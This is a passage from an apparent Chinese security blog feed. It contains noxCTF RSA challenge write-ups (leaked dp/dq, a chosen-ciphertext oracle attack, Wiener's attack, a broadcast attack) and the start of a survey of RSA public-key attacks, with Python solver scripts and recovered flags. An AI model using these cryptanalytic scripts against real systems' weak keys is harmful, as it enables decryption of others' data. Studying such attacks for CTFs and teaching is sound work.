class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span></span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span></span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span></span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line">decrypt(dp,dq,p,q,c)</span><br></pre></td></tr></table></figure></p><p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noxCTF&#123;W31c0m3_70_Ch1n470wn&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Decryptor"><a href="#Decryptor" class="headerlink" title="Decryptor"></a>Decryptor</h2><p>题目如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">I created this nice decryptor for RSA ciphertexts, you should try it out!</span><br><span class="line"></span><br><span class="line">nc chal.noxale.com 4242</span><br><span class="line"></span><br><span class="line">Oh, and someone told me to give this to you: </span><br><span class="line">N = 140165355674296399459239442258630641339281917770736077969396713192714338090714726890918178888723629353043167144351074222216025145349467583141291274172356560132771690830020353668100494447956043734613525952945037667879068512918232837185005693504551982611886445611514773529698595162274883360353962852882911457919 </span><br><span class="line">c = 86445915530920147553767348020686132564453377048106098831426077547738998373682256014690928256854752252580894971618956714013602556152722531577337080534714463052378206442086672725486411296963581166836329721403101091377505869510101752378162287172126836920825099014089297075416142603776647872962582390687281063434 </span><br><span class="line">e = 65537</span><br></pre></td></tr></table></figure></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>我们nc过去后，得到提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please insert your ciphertext to decrypt in hex form:</span><br></pre></td></tr></table></figure></p><p>所以看来服务器是会解密我们input的密文<br>那么这里就是一个典型的选择密文攻击，我们现在有</p><script type="math/tex; mode=display">c \equiv m^e \text{ } mod \text{ } n</script><p>我们可以构造一个x，使得</p><script type="math/tex; mode=display">k \equiv x^ec \text{ } mod \text{ } n</script><p>然后我们把k发送过去，得到</p><script type="math/tex; mode=display">k^d \equiv (x^ec)^d \text{ } mod \text{ } n \\k^d \equiv xc^d \text{ } mod \text{ } n \\k^dx^-1 \equiv m \text{ } mod \text{ } n \\</script><h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><p>所以这里就很简单了，我们构造<code>x=2</code>即可<br>即</p><script type="math/tex; mode=display">k^d2^{-1} \equiv m \text{ } mod \text{ } n</script><p>所以我们Input k</p><script type="math/tex; mode=display">k \equiv 2^ec \text{ } mod \text{ } n</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex((pow(<span class="number">2</span>,e,N)*c)%N)[<span class="number">2</span>:<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><p>得到解密结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcdef086a88cf660ea6ee6da68e46e66c8fa</span><br></pre></td></tr></table></figure></p><p>我们解密即可得到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tmp = <span class="number">0xdcdef086a88cf660ea6ee6da68e46e66c8fa</span></span><br><span class="line"><span class="keyword">print</span> libnum.n2s((tmp*gmpy2.invert(<span class="number">2</span>,N))%N)</span><br></pre></td></tr></table></figure></p><p>得到<code>noxCTF{0u7sm4r73d}</code></p><h2 id="WTF"><a href="#WTF" class="headerlink" title="WTF"></a>WTF</h2><p>题目如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Um uhhhhhhhhh WTF IS THIS?! I give up. Now you try to solve this.</span><br><span class="line"></span><br><span class="line">N = lObAbAbSBlZOOEBllOEbblTlOAbOlTSBATZBbOSAEZTZEAlSOggTggbTlEgBOgSllEEOEZZOSSAOlBlAgBBBBbbOOSSTOTEOllbZgElgbZSZbbSTTOEBZZSBBEEBTgESEgAAAlAOAEbTZBZZlOZSOgBAOBgOAZEZbOBZbETEOSBZSSElSSZlbBSgbTBOTBSBBSOZOAEBEBZEZASbOgZBblbblTSbBTObAElTSTOlSTlATESEEbSTBOlBlZOlAOETAZAgTBTSAEbETZOlElBEESObbTOOlgAZbbOTBOBEgAOBAbZBObBTg</span><br><span class="line"></span><br><span class="line">e = lBlbSbTASTTSZTEASTTEBOOAEbEbOOOSBAgABTbZgSBAZAbBlBBEAZlBlEbSSSETAlSOlAgAOTbETAOTSZAZBSbOlOOZlZTETAOSSSlTZOElOOABSZBbZTSAZSlASTZlBBEbEbOEbSTAZAZgAgTlOTSEBEAlObEbbgZBlgOEBTBbbSZAZBBSSZBOTlTEAgBBSZETAbBgEBTATgOZBTllOOSSTlSSTOSSZSZAgSZATgbSOEOTgTTOAABSZEZBEAZBOOTTBSgSZTZbOTgZTTElSOATOAlbBZTBlOTgOSlETgTBOglgETbT</span><br><span class="line"></span><br><span class="line">c = SOSBOEbgOZTZBEgZAOSTTSObbbbTOObETTbBAlOSBbABggTOBSObZBbbggggZZlbBblgEABlATBESZgASBbOZbASbAAOZSSgbAOZlEgTAlgblBTbBSTAEBgEOEbgSZgSlgBlBSZOObSlgAOSbbOOgEbllAAZgBATgEAZbBEBOAAbZTggbOEZSSBOOBZZbAAlTBgBOglTSSESOTbbSlTAZATEOZbgbgOBZBBBBTBTOSBgEZlOBTBSbgbTlZBbbOBbTSbBASBTlglSEAEgTOSOblAbEgBAbOlbOETAEZblSlEllgTTbbgb</span><br></pre></td></tr></table></figure></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>拿到题目，乍一看非常奇怪，因为<code>(n,e,c)</code>都是编码过的，我们没有办法直接破解，尝试了一些常见编码方式，都无法破解，于是统计了一下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (N,e,c):</span><br><span class="line">    <span class="keyword">print</span> list(collections.Counter(i))</span><br></pre></td></tr></table></figure></p><p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&apos;A&apos;, &apos;B&apos;, &apos;E&apos;, &apos;g&apos;, &apos;l&apos;, &apos;O&apos;, &apos;S&apos;, &apos;b&apos;, &apos;T&apos;, &apos;Z&apos;]</span><br><span class="line">[&apos;A&apos;, &apos;B&apos;, &apos;E&apos;, &apos;g&apos;, &apos;l&apos;, &apos;O&apos;, &apos;S&apos;, &apos;b&apos;, &apos;T&apos;, &apos;Z&apos;]</span><br><span class="line">[&apos;A&apos;, &apos;B&apos;, &apos;E&apos;, &apos;g&apos;, &apos;l&apos;, &apos;O&apos;, &apos;S&apos;, &apos;b&apos;, &apos;T&apos;, &apos;Z&apos;]</span><br></pre></td></tr></table></figure></p><p>发现都一样，并且长度为10，这里就需要开个脑洞了<br>将字母象形为<code>0-9</code><br>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dict = &#123;</span><br><span class="line">&apos;O&apos; : &apos;0&apos;,</span><br><span class="line">&apos;l&apos; : &apos;1&apos;,</span><br><span class="line">&apos;Z&apos; : &apos;2&apos;,</span><br><span class="line">&apos;E&apos; : &apos;3&apos;,</span><br><span class="line">&apos;A&apos; : &apos;4&apos;,</span><br><span class="line">&apos;S&apos; : &apos;5&apos;,</span><br><span class="line">&apos;b&apos; : &apos;6&apos;,</span><br><span class="line">&apos;T&apos; : &apos;7&apos;,</span><br><span class="line">&apos;B&apos; : &apos;8&apos;,</span><br><span class="line">&apos;g&apos; : &apos;9&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后写脚本替换<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> dict.items():</span><br><span class="line">    N = N.replace(key,value)</span><br><span class="line">    c = c.replace(key,value)</span><br><span class="line">    e = e.replace(key,value)</span><br><span class="line">n = int(N)</span><br><span class="line">c = int(c)</span><br><span class="line">e = int(e)</span><br></pre></td></tr></table></figure></p><p>发现e极大<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18165674577527345773800436360005849487629584246818834218136555374150149407637407524285601002127374055517203100485286275425145721883636036574242949710753834106366928190387866524288552807173498852374689387479028711005571557055252495247965030797704485232834280077859527260792773150470416827810790513797809193767</span><br></pre></td></tr></table></figure></p><p>于是想到winner攻击</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>使用github的winner attack的脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/pablocelayes/rsa-wiener-attack</span><br></pre></td></tr></table></figure></p><p>运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  rsa-wiener-attack-master python RSAwienerHacker.py</span><br><span class="line">Hacked!</span><br><span class="line">noxCTF&#123;RSA_1337_10rd&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Trinity"><a href="#Trinity" class="headerlink" title="Trinity"></a>Trinity</h2><p>题目如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Neo, you are the chosen one. The only person who can make sense of these numbers. Do it.</span><br><span class="line"></span><br><span class="line">N = 331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004 </span><br><span class="line">c = 310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243</span><br><span class="line"></span><br><span class="line">N = 302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114 </span><br><span class="line">c = 112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344</span><br><span class="line"></span><br><span class="line">N = 332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323 </span><br><span class="line">c = 10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242</span><br></pre></td></tr></table></figure></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>看到3组(n,c)，第一反应想到的就是低指数广播攻击,即我们有</p><script type="math/tex; mode=display">C_1 \equiv m^{e} \text{ } mod \text{ } n_1\\C_2 \equiv m^{e} \text{ } mod \text{ } n_2 \\C_3 \equiv m^{e} \text{ } mod \text{ } n_3</script><p>根据中国剩余定理，可以有通解</p><script type="math/tex; mode=display">x=\sum_{i=1}^{n}a_it_iM_i \text{ } mod \text{ } M</script><p>其中</p><script type="math/tex; mode=display">M=m_1m_2m_3.....m_n \\M_i = M/m_i \\ M_it_i \equiv 1 \text{ } mod \text{ } m_i</script><p>但是由于这里没有给e，又因为低指数，于是我选择爆破了一下e，但是都没有结果<br>发现一直报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZeroDivisionError: invert() no inverse exists</span><br></pre></td></tr></table></figure></p><p>想到题目给的数字可能有问题，仔细观察，发现只有0-4<br>于是想到5进制<br>转一波以后就正常了</p><h3 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boradcast_fuzz</span><span class="params">(question,e)</span>:</span></span><br><span class="line">    N=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(question)):</span><br><span class="line">        N *= question[i][<span class="string">'n'</span>]</span><br><span class="line">    N_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(question)):</span><br><span class="line">        N_list.append(N / question[i][<span class="string">'n'</span>])</span><br><span class="line">    t_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(question)):</span><br><span class="line">        t_list.append(int(gmpy2.invert(N_list[i], question[i][<span class="string">'n'</span>])))</span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(question)):</span><br><span class="line">        sum = (sum + question[i][<span class="string">'c'</span>] * t_list[i] * N_list[i]) % N</span><br><span class="line">    sum = gmpy.root(sum, e)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> libnum.n2s(sum)</span><br><span class="line">n1 = int(str(n1),<span class="number">5</span>)</span><br><span class="line">n2 = int(str(n2),<span class="number">5</span>)</span><br><span class="line">n3 = int(str(n3),<span class="number">5</span>)</span><br><span class="line">c1 = int(str(c1),<span class="number">5</span>)</span><br><span class="line">c2 = int(str(c2),<span class="number">5</span>)</span><br><span class="line">c3 = int(str(c3),<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">question=[</span><br><span class="line">&#123;<span class="string">'n'</span>:n1,<span class="string">'c'</span>:c1&#125;,</span><br><span class="line">&#123;<span class="string">'n'</span>: n2, <span class="string">'c'</span>: c2&#125;,</span><br><span class="line">&#123;<span class="string">'n'</span>:n3,<span class="string">'c'</span>:c3&#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">20</span>):</span><br><span class="line">    res = boradcast_fuzz(question,i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'noxCTF'</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">print</span> res</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'e=%d'</span>%(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">noxCTF&#123;D4mn_y0u_h4s74d_wh47_4_b100dy_b4s74rd!&#125;</span><br><span class="line">e=3</span><br></pre></td></tr></table></figure></p><h2 id="拓展-Boneh-and-Durfee-attack"><a href="#拓展-Boneh-and-Durfee-attack" class="headerlink" title="拓展-Boneh and Durfee attack"></a>拓展-Boneh and Durfee attack</h2><p>由于题目中有一道Wiener’s Attack，于是我联想到了最近看的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Boneh and Durfee attack</span><br></pre></td></tr></table></figure></p><p>我们知道，如果要使用Wiener’s Attack，有一个特征，即e很大，那么到底有多大？<br>这里有一个评判标准，即</p><script type="math/tex; mode=display">d < \frac{1}{3}N^{\frac{1}{4}}</script><p>那么如果e很大，但d比这里的限定值大怎么办？<br>那么可以尝试Boneh and Durfee attack<br>其使用标准为</p><script type="math/tex; mode=display">d \leq N^{0.292}</script><p>比如这次题目里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d=33859466522204630502415021058361047681307615225229354334148022345758288750359</span><br><span class="line">n=106464658120038110366171046017584728605432723415099799671398095113303220554018149888866005570730116293196252665770382258833879353944414043672822102509840890423260826373058255315521685967807858850204383823245609286166175687064317570157147353365780181201403742497875436372013183350667001942660780839408462806879</span><br></pre></td></tr></table></figure></p><p>我们简单比较下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N1 = <span class="number">1.0</span>/<span class="number">3</span>*pow(n,<span class="number">1.0</span>/<span class="number">4</span>)</span><br><span class="line">N2 = pow(n,<span class="number">0.292</span>)</span><br><span class="line"><span class="keyword">print</span> int(N1)-d</span><br><span class="line"><span class="keyword">print</span> int(N2)-d</span><br></pre></td></tr></table></figure></p><p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">941571295587957309748289456353490745482373040518812393691369</span><br><span class="line"></span><br><span class="line">878909169550944842698019812370775334246473513796204883182700468007058108344282016448403689</span><br></pre></td></tr></table></figure></p><p>明显Boneh and Durfee attack给的空间更大，所以如果我们在不能使用Wiener’s Attack的时候，可以尝试Boneh and Durfee attack<br>利用脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mimoo/RSA-and-LLL-attacks</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default&quot;&gt;&lt;/script&gt;

&lt;figure class=&quot;highlight pla
      
    
    </summary>
    
      <category term="crypto" scheme="http://skysec.top/categories/crypto/"/>
    
    
      <category term="writeup" scheme="http://skysec.top/tags/writeup/"/>
    
      <category term="rsa" scheme="http://skysec.top/tags/rsa/"/>
    
      <category term="crypto" scheme="http://skysec.top/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>Crypto-RSA-公钥攻击小结</title>
    <link href="http://skysec.top/2018/09/17/Crypto-RSA-%E5%85%AC%E9%92%A5%E6%94%BB%E5%87%BB%E5%B0%8F%E7%BB%93/"/>
    <id>http://skysec.top/2018/09/17/Crypto-RSA-公钥攻击小结/</id>
    <published>2018-09-17T01:04:47.000Z</published>
    <updated>2018-10-06T03:28:28.338Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发在先知 https://xz.aliyun.com/t/2731</span><br></pre></td></tr></table></figure><h2 id="e-1"><a href="#e-1" class="headerlink" title="e=1"></a>e=1</h2><p>当e只有1的时候，我们有</p><script type="math/tex; mode=display">c \equiv m \text{ } mod \text{ } n \\</script><p>当c小于N的时候，c即m<br>题目如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">N=0x180be86dc898a3c3a710e52b31de460f8f350610bf63e6b2203c08fddad44601d96eb454a34dab7684589bc32b19eb27cffff8c07179e349ddb62898ae896f8c681796052ae1598bd41f35491175c9b60ae2260d0d4ebac05b4b6f2677a7609c2fe6194fe7b63841cec632e3a2f55d0cb09df08eacea34394ad473577dea5131552b0b30efac31c59087bfe603d2b13bed7d14967bfd489157aa01b14b4e1bd08d9b92ec0c319aeb8fedd535c56770aac95247d116d59cae2f99c3b51f43093fd39c10f93830c1ece75ee37e5fcdc5b174052eccadcadeda2f1b3a4a87184041d5c1a6a0b2eeaa3c3a1227bc27e130e67ac397b375ffe7c873e9b1c649812edcd</span><br><span class="line"></span><br><span class="line">e=0x1</span><br><span class="line"></span><br><span class="line">c=0x4963654354467b66616c6c735f61706172745f736f5f656173696c795f616e645f7265617373656d626c65645f736f5f63727564656c797d</span><br></pre></td></tr></table></figure></p><p>此时只要<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> libnum.n2s(c)</span><br></pre></td></tr></table></figure></p><p>即可</p><h2 id="Rabin算法"><a href="#Rabin算法" class="headerlink" title="Rabin算法"></a>Rabin算法</h2><h3 id="满足条件"><a href="#满足条件" class="headerlink" title="满足条件"></a>满足条件</h3><p>e=2，且n可以被分解<br>（既然n可以被分解，为什么不直接算d？因为不互素，没法求逆元）</p><h3 id="通解方法"><a href="#通解方法" class="headerlink" title="通解方法"></a>通解方法</h3><p>我们有</p><script type="math/tex; mode=display">c \equiv m^2 \text{ } mod \text{ } n \\</script><p>此时计算两个值</p><script type="math/tex; mode=display">m_p  \equiv c^{\frac{1}{4}(p+1)} \text{ } mod \text{ } p \\m_q  \equiv c^{\frac{1}{4}(q+1)} \text{ } mod \text{ } q \\</script><p>又因为<code>gcd(p,q)=1</code><br>那么有</p><script type="math/tex; mode=display">y_pp+y_qq=1</script><p>可以求出两个y，然后再计算下列4值</p><script type="math/tex; mode=display">r \equiv (y_pm_qp + y_qm_pq) \text{ } mod \text{ } n \\-r = n - r \\s \equiv (y_pm_qp - y_qm_pq) \text{ } mod \text{ } n \\-s = n - s \\m \in (r,-r,s,-s)</script><p>小性质</p><script type="math/tex; mode=display">p = gcd(\left|r-s\right|,n)</script><h3 id="计算脚本"><a href="#计算脚本" class="headerlink" title="计算脚本"></a>计算脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'pubkey.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read().encode(<span class="string">'hex'</span>)</span><br><span class="line">    cipher = string.atoi(cipher, base=<span class="number">16</span>)</span><br><span class="line">q = ......</span><br><span class="line">p = ......</span><br><span class="line">inv_p = gmpy2.invert(p, q)</span><br><span class="line">inv_q = gmpy2.invert(q, p)</span><br><span class="line">mp = pow(cipher, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">mq = pow(cipher, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">a = (inv_p * p * mq + inv_q * q * mp) % N</span><br><span class="line">b = N - int(a)</span><br><span class="line">c = (inv_p * p * mq - inv_q * q * mp) % N</span><br><span class="line">d = N - int(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (a, b, c, d):</span><br><span class="line">    s = <span class="string">'%x'</span> % i</span><br><span class="line">    <span class="keyword">if</span> len(s) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        s = <span class="string">'0'</span> + s</span><br><span class="line">    <span class="keyword">print</span> s.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h2 id="低指数攻击"><a href="#低指数攻击" class="headerlink" title="低指数攻击"></a>低指数攻击</h2><h3 id="满足条件-1"><a href="#满足条件-1" class="headerlink" title="满足条件"></a>满足条件</h3><p>e很小，通常为3</p><h3 id="通解方法-1"><a href="#通解方法-1" class="headerlink" title="通解方法"></a>通解方法</h3><script type="math/tex; mode=display">c \equiv m^e \text{ } mod \text{ } n \\m^e = kn+c \\m = \sqrt[e]{kn+c}</script><p>当e很小的时候，我们爆破k，开e次方即可得到m</p><h3 id="计算脚本-1"><a href="#计算脚本-1" class="headerlink" title="计算脚本"></a>计算脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getd</span><span class="params">(e,p,q)</span>:</span></span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e, phi) % phi</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getm</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(m.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">c=....</span><br><span class="line">n=....</span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> (gmpy.root(c + i * n, <span class="number">3</span>)[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">        m = gmpy.root(c + i * n, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> libnum.n2s(m)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="低指数广播攻击"><a href="#低指数广播攻击" class="headerlink" title="低指数广播攻击"></a>低指数广播攻击</h2><h3 id="满足条件-2"><a href="#满足条件-2" class="headerlink" 